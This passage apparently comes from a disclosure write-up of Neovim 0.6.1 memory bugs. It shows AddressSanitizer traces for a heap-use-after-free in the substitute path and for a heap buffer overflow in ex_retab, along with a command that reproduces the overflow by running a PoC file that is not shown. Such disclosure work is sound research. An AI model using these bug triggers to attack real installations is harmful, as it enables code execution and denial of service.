    #183 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #184 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #185 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #186 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #187 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #188 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #189 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #190 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #191 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #192 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #193 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #194 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #195 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #196 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #197 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #198 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #199 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #200 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #201 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #202 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #203 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #204 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #205 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #206 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #207 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #208 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #209 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #210 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #211 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #212 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #213 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #214 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #215 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #216 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #217 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #218 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #219 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #220 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #221 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #222 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #223 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #224 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #225 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #226 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #227 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #228 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #229 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #230 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #231 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #232 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #233 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #234 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #235 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #236 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #237 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #238 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #239 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #240 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #241 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #242 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #243 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #244 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #245 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #246 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23
    #247 0x1498418 in vim_regsub_multi /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6662:16
    #248 0xc17886 in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:4058:20
    #249 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #250 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5

0x6060000016d6 is located 54 bytes inside of 57-byte region [0x6060000016a0,0x6060000016d9)
freed by thread T0 here:
    #0 0x4e4d22 in free (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e4d22)
    #1 0x1114634 in xfree /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:122:3
    #2 0xbf1d95 in sub_set_replacement /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:3260:3
    #3 0xc0f58e in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:3546:7
    #4 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #5 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #6 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #7 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #8 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #9 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #10 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #11 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #12 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #13 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #14 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #15 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #16 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #17 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #18 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #19 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #20 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #21 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #22 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #23 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #24 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #25 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #26 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #27 0x927ea1 in eval0 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3351:9
    #28 0x92aa60 in eval_to_string /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:852:7
    #29 0x14935c0 in vim_regsub_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:6769:23

previously allocated by thread T0 here:
    #0 0x4e4f8d in malloc (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e4f8d)
    #1 0x1114302 in try_malloc /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:74:15
    #2 0x11144ec in xmalloc /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:108:15
    #3 0x1114a86 in xmallocz /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:187:15
    #4 0x1114bde in xmemdupz /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:205:17
    #5 0x1115fd8 in xstrdup /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:424:10
    #6 0xc0f3fa in do_sub /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:3547:16
    #7 0xc0b182 in ex_substitute /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:6016:11
    #8 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #9 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #10 0xc4ed63 in do_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:2242:5
    #11 0xc49dac in cmd_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1805:14
    #12 0xc4a4a3 in ex_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1786:3
    #13 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #14 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #15 0xc69f10 in do_cmdline_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:288:10
    #16 0xfaf82e in exe_commands /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:1654:5
    #17 0xf9f023 in main /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:493:5
    #18 0x7f991d96ad8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-use-after-free (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x47c235) in strlen
Shadow bytes around the buggy address:
  0x0c0c7fff8280: 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00
  0x0c0c7fff8290: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c0c7fff82a0: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa
  0x0c0c7fff82b0: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00
  0x0c0c7fff82c0: 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 fa
=>0x0c0c7fff82d0: fa fa fa fa fd fd fd fd fd fd[fd]fd fa fa fa fa
  0x0c0c7fff82e0: 00 00 00 00 00 00 00 04 fa fa fa fa 00 00 00 00
  0x0c0c7fff82f0: 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fa
  0x0c0c7fff8300: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa
  0x0c0c7fff8310: 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd
  0x0c0c7fff8320: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3188104==ABORTING
```

# 23. Neovim <=0.6.1 Heap Buffer Overflow in `src/nvim/ex_cmds.c`

## Description
Neovim versions up to and including 0.6.1 are affected by a vulnerability where a heap buffer overflow occurs in the `ex_cmds.c` file at line 824. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to write beyond the bounds of a heap-allocated buffer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition or potentially execute arbitrary code.

## PoC
poc at [C220572](./C220572).
```sh
$ ./nvims/neovim-0.6.1/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C220572 -c :qa! 
=================================================================
==3188201==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f8e5b51a000 at pc 0x0000004e4842 bp 0x7ffe89cdfdb0 sp 0x7ffe89cdf578
WRITE of size 49437514 at 0x7f8e5b51a000 thread T0
    #0 0x4e4841 in __asan_memmove (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e4841)
    #1 0xbceadf in ex_retab /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:824:13
    #2 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #3 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #4 0x992e05 in ex_execute /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:9941:7
    #5 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #6 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #7 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #8 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #9 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #10 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #11 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #12 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #13 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #14 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #15 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #16 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #17 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #18 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #19 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #20 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #21 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #22 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #23 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #24 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #25 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #26 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #27 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #28 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #29 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #30 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #31 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #32 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #33 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #34 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #35 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #36 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #37 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #38 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #39 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #40 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #41 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #42 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #43 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #44 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #45 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #46 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #47 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #48 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #49 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #50 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #51 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #52 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #53 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #54 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #55 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #56 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #57 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #58 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #59 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #60 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #61 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #62 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #63 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #64 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #65 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #66 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #67 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #68 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #69 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #70 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #71 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #72 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #73 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #74 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #75 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #76 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #77 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #78 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #79 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #80 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #81 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #82 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #83 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #84 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #85 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #86 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #87 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #88 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #89 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #90 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #91 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #92 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #93 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #94 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #95 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #96 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #97 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #98 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #99 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #100 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #101 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #102 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #103 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #104 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #105 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #106 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #107 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #108 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #109 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #110 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #111 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #112 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #113 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #114 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #115 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #116 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #117 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #118 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #119 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #120 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #121 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #122 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #123 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #124 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #125 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #126 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #127 0xc4ed63 in do_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:2242:5
